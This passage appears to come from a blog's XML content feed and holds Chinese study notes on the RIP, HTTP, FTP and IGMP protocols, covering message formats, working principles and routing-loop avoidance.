title="RIP的工作原理"></a>RIP的工作原理</h5><ol><li>路由器启动时，路由表中只包含直通路由。运行RIP后，路由器会发送Request报文，用来请求邻居路由器的RIP路由</li><li>运行RIP的邻居路由器收到该Request报文后，会根据自己的路由表，生成Response报文进行回复</li><li>路由器在收到Response报文后，会将相应的路由添加到自己的路由表中</li><li>RIP网络稳定以后，每个路由器会<strong>周期性</strong>的向<strong>邻居路由器</strong>通稿自己的<strong>整张路由表</strong>中的路由信息，默认周期为30秒。邻居路由器根据收到的路由信息刷新自己的路由表</li><li>路由表中的每一路由项都对应了一个老化定时器，当路由项在180秒内没有任何更新时，定时器超时，该路由项的度量值变为不可达</li><li>某路由项的度量值变为不可达后，该路由会在Response报文中发布四次(120秒)，然后从路由表中清除。</li></ol><h5 id="RIP协议的特点"><a href="#RIP协议的特点" class="headerlink" title="RIP协议的特点"></a>RIP协议的特点</h5><p>仅和相邻路由器交换信息。</p><pre class="line-numbers language-none"><code class="language-none">交换的信息是当前本路由器所知道的全部信息，即自己的路由表按固定的时间间隔交换路由信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="RIPv1-vs-RIPv2"><a href="#RIPv1-vs-RIPv2" class="headerlink" title="RIPv1 vs RIPv2"></a>RIPv1 vs RIPv2</h5><p><strong>RIPv1</strong></p><blockquote><p style="color:orange;">有类别路由协议，不支持VLSM和CIDR且不支持认证。以广播的形式发送报文，目的IP地址为广播地址255.255.255.255</p></blockquote><p><strong>RIPv2</strong></p><blockquote><p style="color:orange;">无类别路由协议，支持VLSM、路由聚合与CIDR，支持明文认证和MD5密文认证，以广播或者组播(224.0.0.9)方式发送报文</p></blockquote><h4 id="2-2：RIP协议报文格式："><a href="#2-2：RIP协议报文格式：" class="headerlink" title="2.2：RIP协议报文格式："></a>2.2：RIP协议报文格式：</h4><h5 id="RIPv1的报文格式："><a href="#RIPv1的报文格式：" class="headerlink" title="RIPv1的报文格式："></a>RIPv1的报文格式：</h5><img src="./网际协议IP/RIPv1的报文格式.png" style="zoom:67%;" /><p> 每个字段的值和作用</p><blockquote><p>Command:表示该报文是一个请求报文还是响应报文，1表示该报文是请求报文，2表示该报文是响应报文</p><p>Version:表示RIP的版本信息。对于RIPv1，该字段的值为1</p><p>Address Family ldentifier (AFI):表示地址标识信息，对于IP协议，其值为2</p><p>lP address:表示该路由条目的目的IP地址。这一项可以是网络地址、主机地址</p><p>Metric:路由条目的度量值，取值范围1-16。</p></blockquote><blockquote><p style="color:blue;">一个RIP路由更新消息中最多可包含25条路由表项，每个路由表项都携带了目的网络的地址和度量值。整个RIP报文大小限制为不超过504字节，如果整个路由表的更新消息超过该大小，需要发送多个RIPv1报文</p></blockquote><h5 id="RIPv2的报文格式："><a href="#RIPv2的报文格式：" class="headerlink" title="RIPv2的报文格式："></a>RIPv2的报文格式：</h5><img src="./网际协议IP/RIPv2的报文格式.png" style="zoom: 50%;" /><p><strong>RIPv1与RIPv2的不同的字段</strong></p><blockquote><p>AFI:地址族标识除了表示支持的协议类型外，还可以用来描述认证信息<br>Route tag:用于标记外部路由。<br>Subnet Mask:指定IP地址的子网掩码，定义IP地址的网络或子网部分<br>Next Hop:指定通往目的地址的下—跳IP地址。</p></blockquote><h3 id="三、RIP环路："><a href="#三、RIP环路：" class="headerlink" title="三、RIP环路："></a>三、RIP环路：</h3><p>RIP网络正常运行时，RTA会通过RTB学习到10.0.0.0/8网络的路由，度量值为1。一旦路由器RTB的直连网络10.0.0.0/8产生故障，RTB会立即检测到该故障，并认为该路由不可达。此时，RTA还没有收到该路由不可达的信息，于是会继续向RTB发送通往10.0.0.0/8的路由信息。RTB会学习此路由信息，认为可以通过RTA到达10.0.0.0/8网络，度量值为2。<br>此后，RTB发送的更新路由表，又会导致RTA路由表的更新，RTA会新增一条度量值为3的10.0.0.0/8网络路由表项，从而形成路由环路。这个过程会持续下去，直到度量值为16。</p><h4 id="环路避免-水平分割"><a href="#环路避免-水平分割" class="headerlink" title="环路避免-水平分割"></a>环路避免-水平分割</h4><p>路由器从某个接口学到的路由，不会从该接口再发回给邻居路由器。</p><blockquote><p>RTA从RTB学习到的10.0.0.0/8网络的路由不会再从RTA的接收接口重新通告给RTB，由此避免了路由环路的产生。</p></blockquote><img src="./网际协议IP/水平分割.png" style="zoom:67%;" /><h4 id="环路避免-毒性反转"><a href="#环路避免-毒性反转" class="headerlink" title="环路避免-毒性反转"></a>环路避免-毒性反转</h4><p>毒性反转机制的实现可以使错误路由立即超时。<br>毒性反转是指路由器从某个接口学到路由后，将该路由的跳数设置为16，并从原接收接口发回给邻居路由器</p><img src="./网际协议IP/毒性反转.png" style="zoom:67%;" /><h4 id="环路避免-触发更新"><a href="#环路避免-触发更新" class="headerlink" title="环路避免-触发更新"></a>环路避免-触发更新</h4><p style="color:skyblue;">触发更新是指当路由信息发生变化时，立即向邻居设备发送触发更新报文，而不需要等待更新定时器超时，从而加速了网络收敛</p><img src="./网际协议IP/触发更新.png" style="zoom:67%;" />]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>超文本传输协议HTTP</title>
      <link href="/2022/11/18/HTTP%E5%8D%8F%E8%AE%AE/"/>
      <url>/2022/11/18/HTTP%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="超文本传输协议HTTP"><a href="#超文本传输协议HTTP" class="headerlink" title="超文本传输协议HTTP"></a>超文本传输协议HTTP</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#掌握HTTP的报文格式</span><span class="token comment">#掌握HTTP的工作原理</span><span class="token comment">#掌握HTTP常用方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="万维网体系结构"><a href="#万维网体系结构" class="headerlink" title="万维网体系结构"></a>万维网体系结构</h3><p>万维网，全称为World Wide Web，是一个由许多互相链接的超文本组成的系统，通过互联网访问。</p><ul><li>在这个系统中，每个有用的事物，称为“资源”，由全局“统一资源标识符(URL)”标识;这些资源通过超文本传输协议传送给用户，用户通过点击超链接来获得资源</li><li>每一个网站保存有一个或多个文档，叫做万维网页面。浏览器用来读取万维网上的文档<ul><li>客户需要查看网站A的某些信息，它向网站A发送一个请求，请求包含了网站A和其中万维网页面的地址，称为统一资源定位符(URL)</li><li>网站A收到请求后，将指定的文档发送给这个客户。</li></ul></li></ul><img src=".\HTTP协议\用户访问万维网示意图.png" style="zoom:67%;" /><center>用户访问万维网的示意图</center>> <p style="color:orange;">WWW服务是分布式的客户/服务器模式</p><p><strong>浏览器：</strong>客户端程序，可以解释和显示万维网页面。</p><p><strong>服务器：</strong></p><blockquote><ul><li>万维网页面存储在服务器上，当客户请求到达时，对应的页面就发送给客户</li><li>为了提高效率，服务器通常在其高速缓存中存放被请求过的页面</li><li>通过多线程或多进程可使服务器的效率更加提高，服务器在同一时间可回答多个请求</li></ul></blockquote><h4 id="统一资源定位符（URL"><a href="#统一资源定位符（URL" class="headerlink" title="统一资源定位符（URL)"></a>统一资源定位符（URL)</h4><blockquote><p style="color:orange;">Uniform Resource Locator，用于表示Internet上资源的位置和访问方法</p></blockquote><ul><li>URL由4部分组成:<ol><li><p><strong>协议</strong>:指定了用这个URL的客户/服务器程序。如，HTTP、FTP和TELNET等</p></li><li><p>主机:指明了信息所存放的地址，可以是逻辑地址也可以是相应的域名</p></li><li><p>端口:指定了使用主机的某个端口，端口是可选的。</p><blockquote><p style="color:blue;">如果包含了端口，那么端口就插入在主机和路径之间，和主机用冒号分隔开</p></blockquote></li><li><p>路径:指定了文件存放的位置。路径本身可以包含斜线，用于将目录与子目录和文件分隔开。</p></li></ol></li></ul><img src=".\HTTP协议\统一资源定位符.png" style="zoom:50%;" /><center>统一资源定位符格式:</center>##### 静态文档<p>内容固定的文档，由服务器创建。文档的内容是在创建文档时就确定的，而不是在使用它时。</p><h5 id="动态文档"><a href="#动态文档" class="headerlink" title="动态文档"></a>动态文档</h5><p>在浏览器请求该文档时才由万维网服务器创建出来。当请水到丛的，力维网服务器就运行创建动态文档的应用程序。服务器返回这个程序或脚本的输出，把它作为对请求该文档的浏览器的响应。<br>对每个请求都创建出新的文档，所以每个请求得到的动态文档内容可能不同。</p><h5 id="活动文档"><a href="#活动文档" class="headerlink" title="活动文档"></a>活动文档</h5><p>有些文档需要程序在客户端运行，称为活动文档。当浏览器请求活动文档时，服务器就发送这个文档的一个副本或脚本，然后这个文档就在客户（浏览器)端运行。</p><h3 id="HTTP报文格式："><a href="#HTTP报文格式：" class="headerlink" title="HTTP报文格式："></a>HTTP报文格式：</h3><p>超文本传输协议，Hyperlext Transfer Protocol，用于访问万维网上的数据</p><p>它是一种详细规定了浏览器和万维网服务器之间互相通信的规则，通过因特网传送万维网文档的数据传送协议。<br>协议以普通文本、超文本、音频、视频等格式传输数据，它可以快速的在文档之间跳转</p><ul><li><blockquote><p style="color:orange;">HTTP是一个应用层协议，它使用TCP连接进行可靠的传送，在熟知端口80上提供服务。</p></blockquote></li></ul><blockquote><p style="color:black;">HTTP报文有两种类型:请求报文和响应报文</p>- 两种报文格式只有开始行不同。</blockquote><ul><li><p> 首部行</p></li><li><p>用来说明浏览器、服务器或报文主体的一些信息。</p></li><li><p>由关键字/值对组成，每行一对，关键字和值用英文冒号“:”分隔，结束的地方都要有回车换行</p></li><li><p>首部可以有好几行，但也可以不使用。</p></li><li><p>整个首部行结束时，还要有一个空行将首部行和后面的实体主体分</p></li><li><p>实体主体</p><ul><li>在请求报文中一般不用，而在响应报文中也可能没有这个字段</li></ul></li></ul><h4 id="HTTP请求报文："><a href="#HTTP请求报文：" class="headerlink" title="HTTP请求报文："></a>HTTP请求报文：</h4><img src=".\HTTP协议\HTTP请求报文.png" style="zoom:67%;" /><ul><li><p>方法:</p><ul><li><p>常见的有GET和POST方法，在地址栏中输入网址访问网页时，浏览器采用GET方法向服务器获取资源，POST方法要求服务器接受附在请求后面的数据，常用于提交表单。</p><img src=".\HTTP协议\HTTP方法.png" style="zoom:67%;" /></li></ul></li><li><p>URL:向服务器请求的资源</p></li><li><p>HTTP版本:目前是http/1.1。</p></li><li><p>首部字段：</p><ul><li>Accept:指定客户端接受哪些类型的信息，如text/html,image/gif等</li><li>Accept-Language:指定一种自然语言。</li><li>Accept-Encoding:指定可接受的内容编码，如gzip, deflate。</li><li>User-Agent: 允许客户端将它的操作系统、浏览器和其它属性告诉服务器</li><li>Host:目标服务器</li><li>Connection:连接状态，如Keep-Alive，Close。</li></ul></li></ul><h4 id="HTTP回应报文"><a href="#HTTP回应报文" class="headerlink" title="HTTP回应报文"></a>HTTP回应报文</h4><img src=".\HTTP协议\HTTP回应报文.png" style="zoom:67%;" /><ul><li><p>版本:与请求报文相同</p></li><li><p>状态码:表示服务器的响应类型，有三位数字组成，其中第一个数字定义了响应的类别，有五种可能取值:</p><blockquote><ul><li>1xx:通知信息—表示请求已接收，继续处理</li><li>2xx:成功—表示请求已被成功接收、理解、接受</li><li>3xx:重定向一用于已经移动的文件</li><li>4xx:客户端错误—请求有语法错误或请求无法实现</li><li>5xx:服务器端错误—服务器失效无法完成请求</li></ul></blockquote></li></ul><img src=".\HTTP协议\HTTP协议状态码.png" style="zoom: 50%;" /><center>HTTP协议状态码：</center>- 短语:解释状态码的简单短语- 首部字段  - Date:消息产生时间  - Server:服务器用来处理请求的软件  - Set- cookie:设置Cookie及其路径  - Content-Length:实体正文的长度，十进制  - Connection:连接状态。  - Content-Type:发送给接收者的实体正文的媒体类型，如Content-Type:text/html;charset=GB2312。<h3 id="持久与非持久链接"><a href="#持久与非持久链接" class="headerlink" title="持久与非持久链接"></a>持久与非持久链接</h3><h4 id="非持久连接"><a href="#非持久连接" class="headerlink" title="非持久连接"></a>非持久连接</h4><ul><li>对每一个请求/响应都要建立一次TCP连接</li><li>非持久连接策略给服务器造成了很大的开销，因为服务器需要N个不同的缓存，而每次打开连接时都要使用慢开始过程</li><li>版本1.1以前的HTTP协议默认是非持久连接</li></ul><h4 id="持久连接"><a href="#持久连接" class="headerlink" title="持久连接"></a>持久连接</h4><ul><li><p>在使用持久连接时，服务器在发送响应后，让连接继续为一些请求打开</p></li><li><p>服务器可以在客户发送关闭请求时等待或关闭这个连接。</p></li><li><p>服务器可在相同的TCP连接上向客户发送多个对象</p><blockquote><p>HTTP版本1.1默认使用持久连接策略。</p></blockquote></li></ul><h3 id="万维网的工作过程："><a href="#万维网的工作过程：" class="headerlink" title="万维网的工作过程："></a>万维网的工作过程：</h3><p>每个万维网网点都有一个服务器,它不断地监听TCP的端口80，以便发现是否有浏览器（即万维网客户)向它发出连接建立请求。一旦监听到连接请求并建立了TCP连接之后，浏览器就向万维网服务器发出浏览某个页面的请求，服务器接着就返回所请求的页面作为响应。最后释放TCP连接。</p><img src=".\HTTP协议\万维网工作过程.png" style="zoom:67%;" />]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件传输协议FTP</title>
      <link href="/2022/11/17/%E5%BA%94%E7%94%A8%E5%B1%82FTP%E5%8D%8F%E8%AE%AE/"/>
      <url>/2022/11/17/%E5%BA%94%E7%94%A8%E5%B1%82FTP%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="文件传输协议FTP"><a href="#文件传输协议FTP" class="headerlink" title="文件传输协议FTP"></a>文件传输协议FTP</h2><p>[TOC]</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#掌握FTP的工作原理#掌握FTP常用命令的使用方法及用途<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="TFP简介："><a href="#TFP简介：" class="headerlink" title="TFP简介："></a>TFP简介：</h3><p><strong>FTP (File Transfer Protocol）服务：</strong></p><p>FTP是TCP/IP网络上两台计算机之间传送文件的协议，它是在Internet上最早使用的协议之一。</p><blockquote><p style="color:blue;">FTP客户机可以给服务器发出命令来下载文件、上传文件、创建或改变服务器上的目录</p></blockquote><ul><li>原来的FTP软件多是命令行操作，有了像Filezilla这样的图形界面软件，使用FTP传输变得方便易学。</li><li>大多数FTP服务面向大众，不需要身份认证，即“匿名FTP服务器”。</li></ul><blockquote><p style="color:orange;">FTP协议是应用层的协议，它基于运输层，负责进行文件的传输</p></blockquote><ul><li>FTP是一个8位的客户端-服务器协议，能操作任何类型的文件而不需要进一步处理。</li><li>FTP服务<strong>一般运行在TCP的20和21两个端口</strong>。端口20用于在客户端和服务器之间<strong>传输数据流</strong>，而端口21用于<strong>传输控制流</strong>，并且是命令通向ftp服务器的入口</li></ul><h3 id="两种TCP连接"><a href="#两种TCP连接" class="headerlink" title="两种TCP连接"></a>两种TCP连接</h3><blockquote><p>控制连接:建立之后一直持续到客户和服务器间的通信完成为止，用于传送控制命令，服务器使用21号端口</p></blockquote><blockquote><p>数据连接:根据通信的需要随时建立和释放，用于数据传输，服务器通常使用20号端口</p></blockquote><h5 id="控制连接"><a href="#控制连接" class="headerlink" title="控制连接:"></a>控制连接:</h5><p>创建步骤:服务器在熟知端口21发出被动打开，等待客户，客户使用临时端口发出主动打开。</p><img src="D:\blog\shierjinghuang\source\_posts\应用层FTP协议\创建TCP连接.png" style="zoom:67%;" /><h5 id="数据连接："><a href="#数据连接：" class="headerlink" title="数据连接："></a>数据连接：</h5><ul><li><strong>主动模式</strong>(PORT)由服务器端向客户端发起数据连接</li><li><strong>被动模式</strong>(PASV)由客户端向服务器端发起数据连接</li></ul><blockquote><p style="color:orange;">主动模式是服务器主动连接客户的数据端口，被动模式是服务器被动地等待客户连接自己的数据端口</p></blockquote><h4 id="主动模式下的FTP服务"><a href="#主动模式下的FTP服务" class="headerlink" title="主动模式下的FTP服务"></a>主动模式下的FTP服务</h4><p><strong>PORT(主动)模式的默认数据端口是20，控制端口是21</strong></p><ul><li><strong>连接过程</strong><ul><li>连接时，客户端使用随机的端口N(N&gt;1024)连接服务器的控制端口21建立控制连接</li><li>然后客户端开放N+1号端口进行监听，并通过控制连接向服务器发送命令PORT N+1</li><li>服务器用自己的数据端口20连接到客户端的N+1端口，建立数据连接。</li></ul></li></ul><h5 id="主动模式存在的问题："><a href="#主动模式存在的问题：" class="headerlink" title="主动模式存在的问题："></a>主动模式存在的问题：</h5><blockquote><p style="color:orange;">PORT(主动)模式发送端口给服务器，由服务器连回客户端</p></blockquote><ol><li>如果客户端有防火墙，这样的连接会被认为是外部主机试图连接内部的主机，通常情况下是不允许的</li><li>为了解决这个问题，引入了PASV（被动）模式。</li></ol><h4 id="被动模式下的FTP服务"><a href="#被动模式下的FTP服务" class="headerlink" title="被动模式下的FTP服务"></a>被动模式下的FTP服务</h4><ul><li><p>连接过程</p><ul><li>连接时，客户端使用一个随机的端口N(N&gt;1024)连接服务器的21端口建立控制连接</li><li>通过控制连接向服务器发送命令PASV (被动模式)。</li><li>服务器使用一个随机的数据端口M(M&gt;1024)并通过控制连接发回客户端</li><li>客户端用数据端口N+1连接服务器的端口M。</li></ul><p>由于是客户端主动发起数据连接，这样就解决了防火墙带来的问题。</p></li></ul><h3 id="FTP通信："><a href="#FTP通信：" class="headerlink" title="FTP通信："></a>FTP通信：</h3><p><strong>控制连接上的通信：</strong>FTP使用NVT ASCII字符集在控制连接上通信。通信过程使用命令和响应来完成，命令和响应都是一个短行，因此不必考虑它的文件结构。每一行以回车换行结束</p><img src="D:\blog\shierjinghuang\source\_posts\应用层FTP协议\FTP控制链路上的通信.png" style="zoom:50%;" /><p><strong>数据连接上的通信：</strong>在传送数据之前，客户使用控制连接来做传输准备，定义文件类型、数据结构、传输方式</p><img src="D:\blog\shierjinghuang\source\_posts\应用层FTP协议\FTP数据连接上的通信.png" style="zoom:50%;" /><h4 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h4><ol><li>ASCII文件:传送文本文件的默认格式。每一个字符使用NVT ASCII进行编码。发送端把文件从它自己的表示转换成NVT ASCII字符，而接收端从NVT ASCII字符转换成它自己的字符</li><li>EBCDIC文件:若连接的一端或两端使用EBCDIC编码，则可使用EBCDIC编码传送文件</li><li>图像文件:传送二进制文件的默认格式。这种文件是作为连续的比特流传送而没有任何解释或编码。在大多数情况下它用来传送二进制文件，如已编译的程序。</li></ol><h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><ul><li>文件结构（默认)︰这种文件没有结构，它是连续的字节流</li><li>记录结构:这种文件划分为一些记录，这只能用于文本文件</li><li>页面结构:这种文件划分为一些页面，每一个页面有页面号和页面首部。页面可以随机地或顺序地进行存取</li></ul><h4 id="传输方式"><a href="#传输方式" class="headerlink" title="传输方式"></a>传输方式</h4><blockquote><p>流方式:这是默认方式。数据作为连续的字节流从FTP交付给TCP。TCP负责把数据划分为适当大小的报文。若数据是简单的字节流（文件结构），就不需要文件结束符。若数据划分为记录（记录结构)，则每一个记录有1字节的记录结束（EOR）字符，而在文件的结束处有文件结束（EOF）字符。</p></blockquote><blockquote><p>块方式:数据可以按块从FTP交付给TCP。每一个块的前面有3字节首部。第一个字节叫做块描述符，后两个字节定义块的大小，以字节为单位。</p></blockquote><blockquote><p>压缩方式:若文件很大，数据可进行压缩。通常使用的压缩方法是游程长度编码。数据单元的连续出现数可以用一个“出现”和“重复数”来替换。在文本文件中，这通常是空格。在二进制文件中，空字符常常被压缩。</p></blockquote><h4 id="文件传送"><a href="#文件传送" class="headerlink" title="文件传送"></a>文件传送</h4><blockquote><p>从服务器把文件复制到客户端叫做<strong>读取</strong>文件，使用RETR命令完成</p></blockquote><blockquote><p>从客户端把文件复制到服务器叫做<strong>存储</strong>文件，使用STOR命令完成。</p></blockquote><p>从服务器向客户端发送目录列表或文件名，使用LIST命令完成。FTP把目录或文件名列表当作文件，在数据连接上发送。</p><img src="D:\blog\shierjinghuang\source\_posts\应用层FTP协议\FTP文件传送.png" style="zoom:67%;" /><h3 id="FTP响应与命令："><a href="#FTP响应与命令：" class="headerlink" title="FTP响应与命令："></a>FTP响应与命令：</h3><blockquote><p style="color:blue;">FTP使用控制连接在客户进程和服务器进程之间完成交互操作，客户端向服务器发送命令，服务器给客户返回响应</p></blockquote><h5 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h5><ul><li>命令形式是ASCII大写字符，后面的变量可以有，也可以没有。</li><li>命令可以粗略地划分为6组:接口命令、文件管理命令、数据格式化命端口定义命令、文件传送命令以及杂项命令。</li></ul><img src="D:\blog\shierjinghuang\source\_posts\应用层FTP协议\FTP命令.png" style="zoom: 50%;" /><h5 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h5><blockquote><p style="color:blue;">每一个FTP命令都应该有响应。响应由两个部分组成:3个数字以及跟随在后面的文本。数字部分定义代码，文本部分定义所需的参数或额外的解释</p></blockquote><img src="D:\blog\shierjinghuang\source\_posts\应用层FTP协议\FTP相应.png" style="zoom:67%;" />]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Internet组管理协议IGMP</title>
      <link href="/2022/11/16/IGMP/"/>
      <url>/2022/11/16/IGMP/</url>
      
        <content type="html"><![CDATA[<h2 id="Internet组管理协议IGMP"><a href="#Internet组管理协议IGMP" class="headerlink" title="Internet组管理协议IGMP"></a>Internet组管理协议IGMP</h2><p>[TOC]</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 掌握IGMP协议的报文格式</span><span class="token comment"># 掌握IGMP协议的工作原理</span><span class="token comment"># 理解多播组地址到以太网地址的映射</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="单播与多播与广播"><a href="#单播与多播与广播" class="headerlink" title="单播与多播与广播:"></a>单播与多播与广播:</h3><blockquote><p style="color:red;">单播(unicast):    单个源站与单个目的站之间的通信叫作单播，IP数据报中的源IP地址和目的IP地址分别代表了源站和目的站。</p></blockquote><blockquote><p style="color:blue;">绝大多数的网络应用程序是单播</p></blockquote><blockquote><p style="color:red;">多播/组播(multicast): 一个源站和多个目的站之间的通信叫作多播。</p></blockquote><blockquote><ul><li>IP数据报中的源地址是单播地址，目的地址是组地址(D类地址)</li><li>路由器收到组播数据包后，可从它的多个接口转发出去<br>目前，组播机制没有被广泛支持，主要的组播路由机制有距离向量多播路由协议(DVMRP)和协议无关组播(PIM) .</li></ul></blockquote><blockquote><p style="color:red;">广播(broadcast):广播源站和目的站是一对多的，源站只有一个，但所有其它主机都是目的站Internet不支持广播，因为这会产生非常大的通信量</p></blockquote><h4 id="组播"><a href="#组播" class="headerlink" title="组播:"></a>组播:</h4><p>优点：采用组播技术后，即使用户数量成倍增长，主干网带宽不需要随之增加。从而解决了宽带应用对带宽和服务质量的要求问题</p><img src=".\IGMP\组播示意.png" style="zoom: 33%;" /><p>组播比多个单播具有更小的分组时延</p><h5 id="组播地址范围："><a href="#组播地址范围：" class="headerlink" title="组播地址范围："></a>组播地址范围：</h5><blockquote><ol><li>IANA(国际因特网地址分配委员会）把D类地址空间用于IP组播地址</li><li>IP组播地址的范围是:224.0.0.0~239.255.255.255</li><li>常用的组播地址<ul><li>224.0.0.1        在本子网上的所有参加多播的主机和路由器</li><li>224.0.0.2        在本子网上的所有参加多播的路由器</li><li>224.0.0.5        用来给一个网段中所有的OSPF路由器发送OSPF路由信息</li><li>224.0.0.9        RIPv2组地址</li><li>224.0.0.11      供DHCP服务器和中继代理使用</li></ul></li></ol></blockquote><h5 id="动态的组成员"><a href="#动态的组成员" class="headerlink" title="动态的组成员"></a>动态的组成员</h5><blockquote><p style="color:orange;">多播组中的成员是动态的。一个进程可请求其主机参加某个特定组，或在任意时间退出该组</p></blockquote><h5 id="使用硬件进行多播"><a href="#使用硬件进行多播" class="headerlink" title="使用硬件进行多播"></a>使用硬件进行多播</h5><blockquote><p style="color:orange;">当数据报传送到以太网时，以太网利用硬件进行多播，交付给属于该组成员的主机</p></blockquote><h4 id="多播组地址到以太网地址的转换"><a href="#多播组地址到以太网地址的转换" class="headerlink" title="多播组地址到以太网地址的转换"></a>多播组地址到以太网地址的转换</h4><p>多播以太网地址的前25位是0000000100000000010111100这意味着与IP多播相对应的以太网地址范围从01005E000000到01005E7FFFFF。然后将多播IP地址的低23位映射到以太网地址中的低23位。</p><img src=".\IGMP\多播地址到以太网地址的转换.png" style="zoom: 50%;" /><p>由于D类地址的组标识字段长为28bit，将低23位复制到多播MAC地址中，有5bit未使用，所以<strong>映射是多对一的</strong>。</p><p><strong>32个多播IP地址映射到一个以太网多播地址</strong>。既然地址映射不是惟一的，那么设备驱动程序或lP层就必须对数据报进行过滤。因为网卡可能接收到主机不想接收的多播数据帧。另外，如果网卡不提供足够的多播数据帧过滤功能,设备驱动程序就必须接收所有多播数据帧，然后对它们进行过滤。</p><h3 id="IGMP协议简介："><a href="#IGMP协议简介：" class="headerlink" title="IGMP协议简介："></a>IGMP协议简介：</h3><p>IGMP ( lnternet Group Management Protocol)协议，IGMP位于网络层。</p><p style="color:orange;">IGMP协议运行于主机和主机直接相连的路由器之间，是IP主机用来报告多播组成员身份的协议</p>利用IGMP协议，一方面可以使主机通知本地路由器希望加入并接收某个特定多播组的信息;另一方面，路由器可以周期性地查询局域网内某个已知组的成员是否处于活动状态。IGMP使用预留的组播地址224.0.0.1与本地路由器通信。<h3 id="IGMP报文格式："><a href="#IGMP报文格式：" class="headerlink" title="IGMP报文格式："></a>IGMP报文格式：</h3><p>IGMP协议目前有三个版本IGMP、IGMPv2和IGMPv3。</p><p>其中IGMPv2有3种报文类型:</p><blockquote><p>查询报文:路由器查询多播组中是否有活跃成员，分为一般查询和特定查询</p><p>成员关系报告报文:加入多播组或响应查询报文。</p><p>退出报告报文:离开多播组。</p></blockquote><h4 id="IGMPv2报文格式："><a href="#IGMPv2报文格式：" class="headerlink" title="IGMPv2报文格式："></a>IGMPv2报文格式：</h4><img src=".\IGMP\IGMPv2报文格式.png" style="zoom:67%;" /><ol><li><p>类型:定义了IGMP报文类型</p><img src=".\IGMP\IGMP报文类型.png" style="zoom: 80%;" /></li><li><p>响应时间:规定查询必须在多长时间内回答，以十分之一秒为单位。默认值为10秒。在查询报文中，这个值不为0，在其它报文中此字段值为0</p></li><li><p>检验和:对整个IGMP报文进行检验，算法同IP数据报</p></li><li><p>组地址:在一般查询报文中值为0。在特殊的查询报文、成员关系报告报文以及退出报文中值为相应的多播组地址</p></li></ol><h4 id="IGMP的封装"><a href="#IGMP的封装" class="headerlink" title="IGMP的封装"></a>IGMP的封装</h4><p>IGMP报文被封装在IP数据报中，IP层有3个字段需要注意:</p><blockquote><ul><li>协议类型:值为2，高层协议类型为2的IP数据包，其数据部分要交给IGMP协议处理。</li><li>生存时间:值为1，保证了这个报文不离开这个局域网。因为IGMP的作用范围是局域网，IGMP报文不能够发送到局域网以外的地方。</li><li>目的IP地址:为D类组播地址。</li></ul></blockquote><h3 id="多播组成员的加入和退出："><a href="#多播组成员的加入和退出：" class="headerlink" title="多播组成员的加入和退出："></a>多播组成员的加入和退出：</h3><h4 id="加入一个组"><a href="#加入一个组" class="headerlink" title="加入一个组"></a>加入一个组</h4><p>每个主机维护一张成员关系表，成员关系表是**&lt;进程名，组名&gt;<strong>表项的集合。当一个进程P要加入一个新组MG时，就向主机发出申请，主机就在成员关系表中增加</strong>&lt;P, MG&gt;**表项。</p><blockquote><ul><li>如果MG在表中不存在，主机就发送成员关系报告报文</li><li>如果MG在表中已经存在，那就不必发送成员关系报告报文，因为主机已经是MG这个组的成员了</li></ul></blockquote><img src=".\IGMP\加入多播组.png" style="zoom:67%;" /><p>路由器也维护一个多播地址表，给出了连接到每一个接口的成员关系。如果对于这些接口中的一个组有兴趣时，路由器就发送成员关系报告报文，以记录连接在它的接口上的所有的多播组。<br>IGMP协议要求把成员关系报告报文在很短的时间内发送两次。这样，如果第一个报文丢失或受到损伤，那么第二个报文可以代替它。</p><h4 id="退出一个组"><a href="#退出一个组" class="headerlink" title="退出一个组"></a>退出一个组</h4><ol><li><p>当主机发现在一个群组MG中已经没有进程时，就发送退出报告报文，多播路由器收到该报告。当路由器发现在一个特定组中已经没有连接在它的接口上感兴趣的网络，它就发送退出这个组的报告。</p></li><li><p>多播路由器收到退出报告报文时，并不立即删除这个群组MG，而是发送针对MG的查询报文，因为这个退出群组报告仅仅是从一个站点发送来的，可能还有其他站点仍然需要这个群组。</p></li><li><p>若在指定时间内没有收到站点对该群组的成员关系报告，就意味着在本网络上没有这个群组MG的成员，删除这个群组。</p><img src=".\IGMP\退出多播组.png" style="zoom:67%;" /></li></ol><h4 id="监视组成员关系"><a href="#监视组成员关系" class="headerlink" title="监视组成员关系"></a>监视组成员关系</h4><blockquote><ul><li>当仅有一台主机留在一个组中时，如果这台主机离开了这个组而没有发送退出报告报文，那么多播路由器将永远收不到退出报告报文，它认为这个组一直存在这个成员。</li></ul></blockquote><p>多播路由器负责监视局域网上的所有主机或路由器,多播路由器周期性地发送<strong>一般查询报文</strong>，在这个报文中，组地址被置为<strong>0.0.0.0</strong>。</p><p>路由器期望着在它的组表中的每一个组的回答，甚至新的组也可以回答。查询报文的最大响应时间是10秒。当主机路由器收到一般查询报文时，如果它对一个组感兴趣，就发送成员关系报告报文。</p><h4 id="延迟响应"><a href="#延迟响应" class="headerlink" title="延迟响应"></a>延迟响应</h4><blockquote><p 